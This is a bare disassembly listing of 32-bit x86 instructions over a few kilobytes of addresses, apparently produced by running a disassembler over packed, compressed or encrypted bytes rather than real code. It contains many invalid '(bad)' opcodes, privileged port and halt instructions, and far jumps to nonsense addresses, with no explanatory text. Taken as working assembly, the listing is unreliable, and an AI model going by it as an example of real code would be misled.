  41662a:	mov    edi,0xaf5a1c0f
  41662f:	sub    BYTE PTR [eax],ah
  416631:	sar    BYTE PTR [edx],cl
  416633:	lea    esp,[eax-0x58]
  416636:	xchg   ecx,eax
  416637:	dec    ebx
  416638:	icebp  
  416639:	in     al,0x7
  41663b:	pop    ds
  41663c:	xor    cl,BYTE PTR [edi]
  41663e:	add    ebp,edi
  416640:	dec    edi
  416641:	mov    ebx,0xe05c8c30
  416646:	in     al,dx
  416647:	or     DWORD PTR [esi],edi
  416649:	fidivr WORD PTR [ebp-0x27e54fa]
  41664f:	cmp    esp,ecx
  416651:	jmp    0xa10e:0xc6d45e8d
  416658:	leave  
  416659:	jo     0x4166c2
  41665b:	xchg   DWORD PTR [esi+0x3247d116],edx
  416661:	sar    DWORD PTR [ebx*4+0x11c6938c],0x49
  416669:	xor    eax,DWORD PTR [esi-0x77]
  41666c:	dec    ebx
  41666d:	mov    esi,esp
  41666f:	xchg   edi,eax
  416670:	stos   DWORD PTR es:[edi],eax
  416671:	es jno 0x4166ce
  416674:	nop
  416675:	jo     0x416619
  416677:	sbb    eax,0x5e208416
  41667c:	sbb    esi,esi
  41667e:	and    BYTE PTR [edi+0x3e],dl
  416681:	aaa    
  416682:	je     0x4166e7
  416684:	push   edi
  416685:	(bad)  
  416686:	pop    ss
  416687:	ret    
  416688:	mov    ds:0x14ba56cb,al
  41668d:	cmc    
  41668e:	sahf   
  41668f:	div    BYTE PTR [edx]
  416691:	mov    BYTE PTR [eax-0x17e0a4ab],bl
  416697:	retf   0x899f
  41669a:	mov    eax,0xb10a9771
  41669f:	mov    ch,BYTE PTR [edx+0x2f9fe887]
  4166a5:	mov    esi,0x70f5eb09
  4166aa:	loope  0x4166aa
  4166ac:	pop    edx
  4166ad:	repz (bad) 
  4166af:	dec    dl
  4166b1:	ret    
  4166b2:	scas   eax,DWORD PTR es:[edi]
  4166b3:	mul    BYTE PTR [ebx]
  4166b5:	jae    0x4166ad
  4166b7:	psrad  mm7,QWORD PTR [esi+0x560ce12d]
  4166be:	mov    DWORD PTR [ebx],esp
  4166c0:	jns    0x41667a
  4166c2:	xchg   esi,eax
  4166c3:	xchg   bl,bl
  4166c5:	(bad)  
  4166c6:	mov    ah,0xf3
  4166c8:	mov    edi,0x7b2bb1bb
  4166cd:	add    BYTE PTR [ebp-0x7e],al
  4166d0:	lahf   
  4166d1:	ins    BYTE PTR es:[edi],dx
  4166d2:	repnz out dx,eax
  4166d4:	add    al,0x9a
  4166d6:	repz inc esi
  4166d8:	popf   
  4166d9:	jns    0x416724
  4166db:	pop    es
  4166dc:	dec    esp
  4166dd:	mov    esi,0xb6e943b5
  4166e2:	(bad)  
  4166e3:	pop    ss
  4166e4:	imul   edi,esi,0xfffffff5
  4166e7:	jnp    0x416731
  4166e9:	outs   dx,BYTE PTR ds:[esi]
  4166ea:	imul   eax,DWORD PTR [edx-0x7a],0xe33e45c
  4166f1:	mov    al,0x5a
  4166f3:	inc    ecx
  4166f4:	xchg   edi,eax
  4166f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166f6:	frstor [ebx]
  4166f8:	das    
  4166f9:	mov    esi,0x1a484c3c
  4166fe:	scas   eax,DWORD PTR es:[edi]
  4166ff:	addr16 jo 0x416752
  416702:	sti    
  416703:	or     al,0x13
  416705:	mov    eax,?
  416707:	std    
  416708:	int3   
  416709:	shl    DWORD PTR [ecx+0x10e7be86],cl
  41670f:	mov    bh,BYTE PTR [eax+eax*1+0x0]
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	mov    eax,ds:0x63b9d584
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x38000001
  41678d:	add    edi,eax
  41678f:	mov    edi,0x93ade42f
  416794:	lods   eax,DWORD PTR ds:[esi]
  416795:	cdq    
  416796:	lock inc edx
  416798:	push   ebx
  416799:	mov    al,0x8c
  41679b:	fs cli 
  41679d:	lods   eax,DWORD PTR ds:[esi]
  41679e:	xor    dh,BYTE PTR [edx+0x2f]
  4167a1:	scas   al,BYTE PTR es:[edi]
  4167a2:	sub    eax,0x8681fa
  4167a7:	push   0xc821d521
  4167ac:	xchg   esp,eax
  4167ad:	fisttp QWORD PTR gs:[edi]
  4167b0:	leave  
  4167b1:	stos   DWORD PTR es:[edi],eax
  4167b2:	loope  0x416755
  4167b4:	jne    0x416762
  4167b6:	mov    al,ds:0xffe1769a
  4167bb:	cdq    
  4167bc:	loope  0x416792
  4167be:	sahf   
  4167bf:	dec    ebp
  4167c0:	push   cs
  4167c1:	in     eax,0x24
  4167c3:	outs   dx,DWORD PTR ds:[esi]
  4167c4:	mov    dl,0x69
  4167c6:	xchg   ecx,eax
  4167c7:	hlt    
  4167c8:	pop    esp
  4167c9:	jmp    0x41674d
  4167cb:	push   eax
  4167cc:	(bad)  [ebx-0x2a]
  4167cf:	shl    bl,1
  4167d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167d2:	xchg   DWORD PTR [ecx+0x64],eax
  4167d5:	cmp    BYTE PTR [ebx],ah
  4167d7:	ret    0xf40
  4167da:	mov    DWORD PTR [esi-0x608326b6],edx
  4167e0:	cmp    eax,0xb3239fbb
  4167e5:	das    
  4167e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e7:	ins    BYTE PTR es:[edi],dx
  4167e8:	in     eax,0x18
  4167ea:	pop    edi
  4167eb:	(bad)  
  4167ec:	fimul  DWORD PTR [eax]
  4167ee:	and    edi,esp
  4167f0:	adc    DWORD PTR [ecx+0x48],esi
  4167f3:	jmp    0x416854
  4167f5:	push   ss
  4167f6:	jmp    0xd47ea346
  4167fb:	jmp    0x24b44a94
  416800:	dec    ecx
  416801:	mov    eax,ds
  416803:	adc    eax,DWORD PTR [edx]
  416805:	add    ecx,DWORD PTR [esi-0x66dba66e]
  41680b:	call   0xc98c:0xc971418
  416812:	lock xor al,0x2e
  416815:	and    ecx,DWORD PTR [esi]
  416817:	xchg   DWORD PTR [edx],esi
  416819:	ret    
  41681a:	pop    esi
  41681b:	adc    al,0xf
  41681d:	xor    DWORD PTR [eax-0x177658c4],eax
  416823:	mov    DWORD PTR [ecx+ecx*4],ebp
  416826:	push   esp
  416827:	pop    es
  416828:	enter  0xddcb,0xbb
  41682c:	imul   esi,ecx,0x469cd66d
  416832:	int    0x4a
  416834:	pop    ebx
  416835:	sahf   
  416836:	(bad)  
  416837:	sub    ebx,edi
  416839:	je     0x41687d
  41683b:	lods   eax,DWORD PTR ds:[esi]
  41683c:	(bad)  
  41683d:	cmc    
  41683e:	(bad)  
  41683f:	call   0x18909dfb
  416844:	daa    
  416845:	pop    eax
  416846:	test   eax,0x39e7dee1
  41684b:	mov    edi,0x41995eb8
  416850:	push   ebx
  416851:	sbb    al,ah
  416853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416854:	leave  
  416855:	jp     0x41683c
  416857:	popf   
  416858:	in     al,dx
  416859:	push   0x30
  41685b:	adc    BYTE PTR [esi+edi*1+0x79800ad3],dl
  416862:	jno    0x41686c
  416864:	outs   dx,DWORD PTR ds:[esi]
  416865:	push   esp
  416866:	test   BYTE PTR [esi+edx*2-0x307ce09f],0x88
  41686e:	pop    ebx
  41686f:	rcr    BYTE PTR [edx+0x1a],0x92
  416873:	lahf   
  416874:	dec    eax
  416875:	push   eax
  416876:	or     DWORD PTR [edi+0x37],eax
  416879:	and    BYTE PTR [edx],dl
  41687b:	sbb    bh,BYTE PTR [esi+0x2b6b0995]
  416881:	push   ecx
  416882:	mov    cl,0xb9
  416884:	adc    dh,BYTE PTR [ebx+0x5d17f596]
  41688a:	mov    al,ds:0x40b4e1d7
  41688f:	jle    0x416865
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xba714b9
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [edi],dl
  41690d:	(bad)  
  41690e:	sbb    bh,BYTE PTR [eax+0x33]
  416911:	les    ebx,FWORD PTR [ebp+0x24481262]
  416917:	out    dx,al
  416918:	pop    esi
  416919:	dec    ebp
  41691a:	mov    al,ds:0x9635714b
  41691f:	or     BYTE PTR [eax+esi*1-0x18],cl
  416923:	das    
  416924:	push   0xe264302d
  416929:	adc    al,0x58
  41692b:	mov    DWORD PTR [edi+0x2b],edx
  41692e:	scas   al,BYTE PTR es:[edi]
  41692f:	out    dx,eax
  416930:	pop    edx
  416931:	cmp    ah,0x38
  416934:	dec    ecx
  416935:	gs jns 0x4168ed
  416938:	dec    ebx
  416939:	adc    edi,edi
  41693b:	pop    edx
  41693c:	sbb    DWORD PTR [ebp+esi*8-0x33a20f90],0xffffffad
  416944:	jnp    0x4169ab
  416946:	xor    bh,BYTE PTR [edi+ebx*8]
  416949:	(bad)  
  41694b:	cmp    BYTE PTR [ebx],dh
  41694d:	adc    DWORD PTR [ebx],edi
  41694f:	mov    ecx,0x468fc8f7
  416954:	mov    al,0xa9
  416956:	pop    eax
  416957:	xor    eax,0x536e1d9b
  41695c:	rcr    BYTE PTR [ebx],1
  41695e:	xor    BYTE PTR [edi],ah
  416960:	inc    ebp
  416961:	fistp  DWORD PTR [esi-0x797f82e3]
  416967:	sub    eax,0xbe9796bd
  41696c:	mov    ?,WORD PTR fs:[ebx-0x69d84712]
  416973:	fld    DWORD PTR [edx+0x681b8b07]
  416979:	push   ebp
  41697a:	jbe    0x41692e
  41697c:	or     DWORD PTR [ebp+ebx*2+0x72],ebx
  416980:	scas   eax,DWORD PTR es:[edi]
  416981:	push   eax
  416982:	push   es
  416983:	iret   
  416984:	cld    
  416985:	add    al,0x69
  416987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416988:	adc    BYTE PTR [ecx],cl
  41698a:	mov    ebx,0x26acf769
  41698f:	sbb    eax,DWORD PTR [eax+0x6c]
  416992:	jne    0x4169f6
  416994:	jmp    0x3e99:0x3cd5f95d
  41699b:	inc    edi
  41699c:	test   eax,0x36ebf5f4
  4169a1:	pop    ebp
  4169a2:	cmp    eax,0xa69867ce
  4169a7:	add    edx,DWORD PTR [edx]
  4169a9:	stos   BYTE PTR es:[edi],al
  4169aa:	mov    WORD PTR [ecx+0x48],cs
  4169ad:	mov    ch,dh
  4169af:	mov    al,ds:0xd4b345e7
  4169b4:	loopne 0x41696e
  4169b6:	push   0xd83c41ec
  4169bb:	mov    dh,0x5b
  4169bd:	inc    ecx
  4169be:	shl    BYTE PTR [ebx+0x2c2bf18d],1
  4169c4:	push   ecx
  4169c5:	bound  ebx,QWORD PTR [ebx]
  4169c7:	and    BYTE PTR [esi+eiz*8+0x3de00cfd],0xfb
  4169cf:	lods   eax,DWORD PTR ds:[esi]
  4169d0:	jmp    0x17d3280f
  4169d5:	call   DWORD PTR [edx-0x57]
  4169d8:	jnp    0x41699a
  4169da:	cmp    ecx,esp
  4169dc:	mov    ecx,0xd21d9155
  4169e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169e2:	dec    esp
  4169e3:	js     0x4169b5
  4169e5:	out    0x4f,al
  4169e7:	sub    esp,DWORD PTR ds:0xff730d6a
  4169ed:	(bad)  
  4169ee:	cmp    al,0xe8
  4169f0:	data16 jge 0x416977
  4169f3:	dec    eax
  4169f4:	aaa    
  4169f5:	cmp    ch,0x7b
  4169f8:	fucomp st(4)
  4169fa:	inc    esp
  4169fb:	outs   dx,DWORD PTR ds:[esi]
  4169fc:	cli    
  4169fd:	xchg   esi,eax
  4169fe:	dec    edx
  4169ff:	or     DWORD PTR gs:[edx],edi
  416a02:	dec    ebp
  416a03:	adc    al,0xd4
  416a05:	rdpmc  
  416a07:	push   ebp
  416a08:	jp     0x4169bf
  416a0a:	inc    esi
  416a0b:	jmp    0x4169c5
  416a0d:	mov    es,WORD PTR [eax+0xa981]
	...
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x69400ba3
  416a82:	xchg   BYTE PTR [ebp+ebp*2+0x50000ef],ah
  416a89:	add    DWORD PTR [eax],eax
  416a8b:	add    BYTE PTR [eax-0x44fe8dd8],ah
  416a91:	imul   BYTE PTR [edi+ebp*8+0x4bb972ae]
  416a98:	aad    0x95
  416a9a:	sub    ah,dl
  416a9c:	mov    DWORD PTR [ebx-0x3a],esi
  416a9f:	mov    WORD PTR [ebp-0x10],es
  416aa2:	sbb    BYTE PTR [eax-0x50d6c250],0x35
  416aa9:	jno    0x416a6f
  416aab:	push   es
  416aac:	sub    DWORD PTR [ebx-0x4e412294],0xffffff98
  416ab3:	pop    esp
  416ab4:	loopne 0x416af0
  416ab6:	stos   BYTE PTR es:[edi],al
  416ab7:	call   0x8f1f7636
  416abc:	add    BYTE PTR [eax-0x2cb42066],dl
  416ac2:	aad    0xc9
  416ac4:	mov    dl,0x39
  416ac6:	push   esi
  416ac7:	popa   
  416ac8:	pop    esi
  416ac9:	cmp    al,0xa
  416acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416acc:	or     cl,bh
  416ace:	fwait
  416acf:	in     eax,0x22
  416ad1:	popa   
  416ad2:	xor    DWORD PTR [ecx+0x33736a3c],ecx
  416ad8:	leave  
  416ad9:	das    
  416ada:	or     ch,BYTE PTR [ecx]
  416adc:	add    DWORD PTR [ebx-0x3c],edx
  416adf:	mov    cl,0xa5
  416ae1:	sbb    BYTE PTR [edi],bh
  416ae3:	out    dx,eax
  416ae4:	mov    edx,0xfdb0b697
  416ae9:	outs   dx,BYTE PTR ds:[esi]
  416aea:	test   al,0xd9
  416aec:	mov    bh,0x50
  416aee:	xchg   BYTE PTR [edi+0x47],bh
  416af1:	jno    0x416b0f
  416af3:	(bad)  
  416af4:	je     0x416ac5
  416af6:	push   edi
  416af7:	jbe    0x416a96
  416af9:	xchg   DWORD PTR ds:0xa3728bd4,esi
  416aff:	leave  
  416b00:	sub    bl,ch
  416b02:	fdivr  DWORD PTR [ebx-0x3d733534]
  416b08:	jae    0x416b49
  416b0a:	sub    DWORD PTR ds:0xef75ed26,esi
  416b10:	pop    edx
  416b11:	sub    eax,0x58515202
  416b16:	cmp    esi,edi
  416b18:	mov    ds:0xfe8fa2a8,al
  416b1d:	jb     0x416b75
  416b1f:	and    BYTE PTR [edx],bl
  416b21:	mov    ds:0x76ea21f2,eax
  416b26:	push   esp
  416b27:	and    DWORD PTR [ebp+0x6e36f065],esi
  416b2d:	mov    esi,DWORD PTR [ebx]
  416b2f:	mov    bl,0xa0
  416b31:	xchg   ebx,eax
  416b32:	stc    
  416b33:	enter  0x9cbe,0x67
  416b37:	imul   BYTE PTR [eax+eax*4-0x73cfff04]
  416b3e:	and    eax,0xe92a6289
  416b43:	xor    ebx,DWORD PTR ds:0x342935da
  416b49:	cwde   
  416b4a:	jmp    esp
  416b4c:	clc    
  416b4d:	lds    edi,FWORD PTR [edx+edi*1]
  416b50:	fdivr  QWORD PTR [eax]
  416b52:	xchg   esp,eax
  416b53:	das    
  416b54:	inc    bh
  416b56:	mov    dh,0x22
  416b58:	fisub  WORD PTR [ecx+ebp*1-0x79e1ef6c]
  416b5f:	mov    dh,0x95
  416b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b62:	cld    
  416b63:	adc    eax,0xe6deb176
  416b68:	lods   eax,DWORD PTR ds:[esi]
  416b69:	sub    esp,DWORD PTR [ebp+esi*2-0x46a1aae3]
  416b70:	mov    ds:0x7056d5fe,al
  416b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b76:	add    eax,0x9b5d89b4
  416b7b:	mov    esp,ecx
  416b7d:	add    DWORD PTR [ebp-0x7b],ebx
  416b80:	push   edx
  416b81:	shl    DWORD PTR [ecx+0x1d],0x12
  416b85:	add    esp,DWORD PTR [esi]
  416b87:	and    ecx,0x2
  416b8a:	pop    ss
  416b8b:	lahf   
  416b8c:	les    ecx,FWORD PTR [ebx+0xb967c7]
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x9f5b70a9
  416c01:	push   ebp
  416c02:	outs   dx,BYTE PTR ds:[esi]
  416c03:	mov    al,0x72
  416c05:	lock add BYTE PTR [eax],al
  416c08:	add    eax,0xcb000001
  416c0d:	add    edx,DWORD PTR [edi+0x1]
  416c10:	jbe    0x416bbe
  416c12:	iret   
  416c13:	cli    
  416c14:	lods   al,BYTE PTR ds:[esi]
  416c15:	fs pop ebx
  416c17:	popf   
  416c18:	retf   0x8bfa
  416c1b:	fist   WORD PTR es:[edx-0x77]
  416c1f:	sahf   
  416c20:	push   0xffffff90
  416c22:	push   ss
  416c23:	enter  0x538f,0x71
  416c27:	dec    edx
  416c28:	pop    ebx
  416c29:	xor    eax,edi
  416c2b:	inc    ecx
  416c2c:	inc    ecx
  416c2d:	mov    ecx,0xbd5e2b80
  416c32:	cdq    
  416c33:	(bad)  
  416c34:	daa    
  416c35:	mov    al,0x6b
  416c37:	sbb    edi,DWORD PTR [edx+0x21]
  416c3a:	inc    esp
  416c3b:	cdq    
  416c3c:	and    eax,esi
  416c3e:	and    bh,BYTE PTR [edx+ebx*4]
  416c41:	mov    al,0xf2
  416c43:	cmp    eax,0x16c550d0
  416c48:	(bad)  
  416c49:	cmp    al,BYTE PTR [ecx]
  416c4b:	push   esi
  416c4c:	mov    edi,DWORD PTR [edx-0x701187a3]
  416c52:	repnz xor BYTE PTR [edi+ebx*2],0xfa
  416c57:	imul   edx,DWORD PTR [ebx+eiz*1],0x196ad9a1
  416c5e:	mov    ebp,0x5f67024f
  416c63:	out    dx,al
  416c64:	inc    esi
  416c65:	mov    ecx,0x663b6ce7
  416c6a:	in     eax,dx
  416c6b:	arpl   WORD PTR ds:0x20d7c114,cx
  416c71:	adc    al,0x29
  416c73:	jo     0x416c9c
  416c75:	sbb    al,0xcf
  416c77:	or     ah,al
  416c79:	sub    BYTE PTR [esp+ebx*8],dh
  416c7c:	or     DWORD PTR [ebx-0x65],eax
  416c7f:	loop   0x416c75
  416c81:	mov    ds:0x1d05ab5b,al
  416c86:	pop    edi
  416c87:	dec    ebx
  416c88:	inc    edx
  416c89:	out    dx,eax
  416c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c8b:	dec    esi
  416c8c:	mov    al,ds:0xfae66509
  416c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c92:	and    al,0xb0
  416c94:	sub    DWORD PTR [edx+0x1a],esi
  416c97:	mov    ah,0x72
  416c99:	xchg   DWORD PTR [ebx+esi*2+0x7c],ecx
  416c9d:	(bad)  
  416c9f:	sar    DWORD PTR [esi+0x30],0xee
  416ca3:	adc    DWORD PTR [edi],eax
  416ca5:	dec    esp
  416ca6:	push   esi
  416ca7:	jmp    0x5a19abb3
  416cac:	fnclex 
  416cae:	mov    ch,0x46
  416cb0:	out    0xb7,eax
  416cb2:	dec    ecx
  416cb3:	push   ds
  416cb4:	imul   esi,DWORD PTR [eax-0x9],0xffffffd2
  416cb8:	fsub   QWORD PTR [ebx]
  416cba:	out    dx,eax
  416cbb:	xchg   ebx,eax
  416cbc:	xlat   BYTE PTR ds:[ebx]
  416cbd:	cmp    al,BYTE PTR [esp+ecx*1]
  416cc0:	int    0x62
  416cc2:	mov    eax,ds:0xe9f5b6ac
  416cc7:	or     al,0x25
  416cc9:	xchg   ebp,eax
  416cca:	lahf   
  416ccb:	or     eax,0xe7c8aee5
  416cd0:	ins    DWORD PTR es:[edi],dx
  416cd1:	dec    edx
  416cd2:	aas    
  416cd3:	mov    ds:0x78f525ca,al
  416cd8:	pop    ecx
  416cd9:	popf   
  416cda:	xchg   edi,eax
  416cdb:	push   eax
  416cdc:	nop
  416cdd:	and    eax,0xfdc8dd37
  416ce2:	ds lock popa 
  416ce5:	imul   edi,edi,0x47
  416ce8:	enter  0xdc8c,0x7f
  416cec:	leave  
  416ced:	fist   DWORD PTR [ecx-0x144b2a59]
  416cf3:	rol    DWORD PTR [eax+eax*2],cl
  416cf6:	push   es
  416cf7:	aad    0xbd
  416cf9:	or     ch,ah
  416cfb:	repz push ds
  416cfd:	gs xchg esp,eax
  416cff:	stos   BYTE PTR es:[edi],al
  416d00:	jl     0x416d6c
  416d02:	fadd   DWORD PTR [esi+0x4d7b24c2]
  416d08:	pop    ebp
  416d09:	mov    ebx,0x9be734d2
  416d0e:	mov    BYTE PTR [esi+eax*1],bh
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	loop   0x416deb
  416d82:	pop    ecx
  416d83:	inc    esi
  416d84:	ja     0x416d77
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0xb2000001
  416d8d:	mov    al,cl
  416d8f:	adc    eax,0x1546e2fe
  416d94:	test   al,0x71
  416d96:	mov    ds:0x4a53bd0b,eax
  416d9b:	hlt    
  416d9c:	push   ebx
  416d9d:	add    bh,BYTE PTR [esi+ebx*8]
  416da0:	mov    esi,0xe9632d11
  416da5:	adc    eax,0x45c3d53f
  416daa:	into   
  416dab:	mov    al,ds:0x92e7d70a
  416db0:	add    esp,DWORD PTR [ebx-0x6b]
  416db3:	push   0xf662080e
  416db8:	xor    dl,bh
  416dba:	sub    cl,ch
  416dbc:	sbb    DWORD PTR ds:0x8620251,esi
  416dc2:	scas   eax,DWORD PTR es:[edi]
  416dc3:	push   0xffffffa2
  416dc5:	test   BYTE PTR [edi],dh
  416dc7:	and    ah,ch
  416dc9:	ja     0x416d77
  416dcb:	inc    esi
  416dcc:	xor    DWORD PTR [ecx],0x20
  416dcf:	call   0x8d3:0xe54cf7bf
  416dd6:	sub    al,0x52
  416dd8:	into   
  416dd9:	and    eax,DWORD PTR [ebx]
  416ddb:	mov    esi,0x1b14dcdc
  416de0:	cdq    
  416de1:	sbb    al,0xfb
  416de3:	aaa    
  416de4:	pop    esi
  416de5:	in     ax,0xe4
  416de8:	push   ebx
  416de9:	fld    TBYTE PTR [ecx+eax*8-0x7cd5a097]
  416df0:	pusha  
  416df1:	mov    ecx,0x683d2757
  416df6:	imul   ecx,edx,0x237fe290
  416dfc:	test   DWORD PTR [esi],0xedef4512
  416e02:	jb     0x416d97
  416e04:	adc    al,0x33
  416e06:	in     eax,0xc3
  416e08:	pop    ebp
  416e09:	js     0x416dda
  416e0b:	push   0x55e2d27b
  416e10:	fisub  DWORD PTR [ecx-0x7]
  416e13:	jno    0x416ddd
  416e15:	fs adc eax,0xd30ebf45
  416e1b:	mov    ebp,0x1df202db
  416e20:	je     0x416e00
  416e22:	mov    DWORD PTR [eax],0xfe3d0a0f
  416e28:	mov    ebp,0xe8ae8679
  416e2d:	sbb    esp,DWORD PTR [edi-0x12]
  416e30:	cmp    edi,DWORD PTR [edi]
  416e32:	or     eax,DWORD PTR [eax+0x5f]
  416e35:	les    edx,FWORD PTR [ebx-0x6e36d83f]
  416e3b:	addr16 ds js 0x416ea9
  416e3f:	or     DWORD PTR [ecx-0x1d],esp
  416e42:	into   
  416e43:	js     0x416e5b
  416e45:	in     eax,0x8f
  416e47:	sbb    eax,eax
  416e49:	dec    eax
  416e4a:	bound  esi,QWORD PTR ds:0x6efbcde7
  416e50:	es pop esi
  416e52:	loope  0x416e0e
  416e54:	and    esp,ebx
  416e56:	adc    DWORD PTR [ecx],ebx
  416e58:	push   eax
  416e59:	iret   
  416e5a:	(bad)  
  416e5b:	cmp    BYTE PTR [esp+ebp*2-0x14307806],bh
  416e62:	push   0xffffffaa
  416e64:	and    bh,BYTE PTR [edx+edx*2-0x5c]
  416e68:	jnp    0x416e9c
  416e6a:	xor    al,0x15
  416e6c:	ds dec esi
  416e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e6f:	retf   
  416e70:	stos   DWORD PTR es:[edi],eax
  416e71:	ret    
  416e72:	lds    edx,FWORD PTR [ebp+eiz*4+0x6d]
  416e76:	sub    BYTE PTR [ecx-0x68],0x66
  416e7a:	add    DWORD PTR [esi],esi
  416e7c:	mov    WORD PTR [ebx+0x6c64470],ss
  416e82:	sbb    al,0xb4
  416e84:	add    eax,0xc6e1eb06
  416e89:	xchg   edx,eax
  416e8a:	dec    eax
  416e8b:	(bad)  
  416e8c:	ins    DWORD PTR es:[edi],dx
  416e8d:	pop    ecx
  416e8e:	or     edi,eax
  416e90:	iret   
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x2c8eea
  416f02:	iret   
  416f03:	in     eax,0x7c
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    eax,0xc9000001
  416f0d:	push   edi
  416f0e:	mov    esi,0x889140a1
  416f13:	xor    DWORD PTR [esp+edx*8+0x36],eax
  416f17:	sbb    al,0x23
  416f19:	push   ss
  416f1a:	push   es
  416f1b:	jmp    0xd39c9919
  416f20:	jmp    0x5d82f4ea
  416f25:	and    edi,DWORD PTR [ebx+ebx*8+0x71d344c4]
  416f2c:	xor    BYTE PTR [ebx-0x19],0x12
  416f30:	into   
  416f31:	xchg   ebx,eax
  416f32:	in     eax,dx
  416f33:	xchg   DWORD PTR [edi+0x308125a9],ecx
  416f39:	dec    ebx
  416f3a:	out    0xd3,al
  416f3c:	push   0x938dee30
  416f41:	mov    edi,0xb12d0fb
  416f46:	icebp  
  416f47:	cwde   
  416f48:	test   DWORD PTR [edi],esp
  416f4a:	pop    edx
  416f4b:	jno    0x416edf
  416f4d:	adc    eax,DWORD PTR gs:[eax-0x7ee5d629]
  416f54:	adc    DWORD PTR [edx],ebp
  416f56:	aas    
  416f57:	xchg   esi,eax
  416f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f59:	mov    cl,ah
  416f5b:	retf   0xfdc
  416f5e:	rcr    al,0x42
  416f61:	aam    0x47
  416f63:	je     0x416f4c
  416f65:	cld    
  416f66:	fcomp  DWORD PTR [ecx+0x5]
  416f69:	outs   dx,DWORD PTR ds:[esi]
  416f6a:	cli    
  416f6b:	xor    DWORD PTR [ecx],0x74
  416f6e:	loope  0x416f9d
  416f70:	and    eax,0x245b243a
  416f75:	stc    
  416f76:	cli    
  416f77:	fs repnz push edx
  416f7a:	cmp    DWORD PTR [ecx-0x79],0xffffffa9
  416f7e:	rep outs dx,BYTE PTR ds:[esi]
  416f80:	jge    0x416fe4
  416f82:	mov    dh,0xe2
  416f84:	out    0xee,eax
  416f86:	mov    eax,ds:0x40afb4bc
  416f8b:	xor    DWORD PTR [esi+0x76],eax
  416f8e:	mov    eax,0x56128d7c
  416f93:	push   esp
  416f94:	fadd   QWORD PTR [ecx+esi*4+0x11ccef41]
  416f9b:	or     eax,0xa71bc2f9
  416fa0:	pop    ds
  416fa1:	sub    al,0xa6
  416fa3:	out    0x47,al
  416fa5:	push   eax
  416fa6:	or     bl,BYTE PTR [ebp-0x57]
  416fa9:	ret    
  416faa:	xor    al,0x19
  416fac:	mov    eax,ds:0xf0782a2c
  416fb1:	(bad)  
  416fb3:	das    
  416fb4:	js     0x416f5f
  416fb6:	cli    
  416fb7:	sar    DWORD PTR [ecx-0x1f0e2f07],0x36
  416fbe:	sub    eax,0xc16336a3
  416fc3:	iret   
  416fc4:	lods   al,BYTE PTR ds:[esi]
  416fc5:	sub    eax,0x2b91e24e
  416fca:	adc    BYTE PTR [edx+0x6df845e3],dh
  416fd0:	bound  ecx,QWORD PTR [ecx]
  416fd2:	arpl   WORD PTR [edi+0x13faa53],di
  416fd8:	add    DWORD PTR [ecx],ecx
  416fda:	add    al,0xed
  416fdc:	fcmovu st,st(4)
  416fde:	(bad)  [ebx-0x76eb0f94]
  416fe4:	mov    ah,0xa0
  416fe6:	pop    eax
  416fe7:	repnz inc eax
  416fe9:	push   edx
  416fea:	cmp    BYTE PTR [eax],0x5f
  416fed:	xchg   ebx,eax
  416fee:	mov    BYTE PTR [edx],al
  416ff0:	jo     0x417060
  416ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ff3:	push   es
  416ff4:	add    al,0xa5
  416ff6:	mov    al,0xf2
  416ff8:	retf   
  416ff9:	ins    DWORD PTR es:[edi],dx
  416ffa:	shl    edx,cl
  416ffc:	mov    ah,BYTE PTR [ecx-0x2575f3ff]
  417002:	hlt    
  417003:	ja     0x416fe8
  417005:	jno    0x41701d
  417007:	add    al,0xb0
  417009:	push   eax
  41700a:	daa    
  41700b:	nop
  41700c:	sub    eax,0xc5ab1070
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    eax,DWORD PTR [ecx-0x7e3d556f]
